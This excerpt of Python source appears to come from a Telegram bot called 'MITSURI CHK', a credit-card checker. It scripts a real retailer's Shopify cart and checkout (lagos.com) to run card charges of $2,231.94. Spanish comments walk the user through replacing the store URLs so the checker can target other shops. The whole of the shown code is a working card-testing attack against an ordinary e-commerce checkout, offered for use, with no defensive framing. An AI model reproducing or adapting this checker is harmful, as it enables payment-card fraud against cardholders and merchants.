...
@Client.on_message(filters.command("ad", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
<b>あ MITSURI CHK あ
ESTADO: <code>ON</code>
GATEWAY: <code>ADONI</code>
PASARELA: <code>SHOPIFY $2,231.94</code>
</b>""")
...
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}
 """)
        ...
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '41671183728772'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.lagos.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.lagos.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.lagos.com"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=46734049412&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B17122910111&checkout%5Btotal_price%5D=223194&checkout_submitted_request_url=https%3A%2F%2Fwww.lagos.com%2F34602647684%2Fcheckouts%2Ffd49d9c2fbcef8cf0481dbcd6e507c46&checkout_submitted_page_id=33c86b0a-8DFA-46CC-45F1-264F757870FF&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=769&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
...
<b>MITSURI CHK - SH $2,231.94 USD</b>
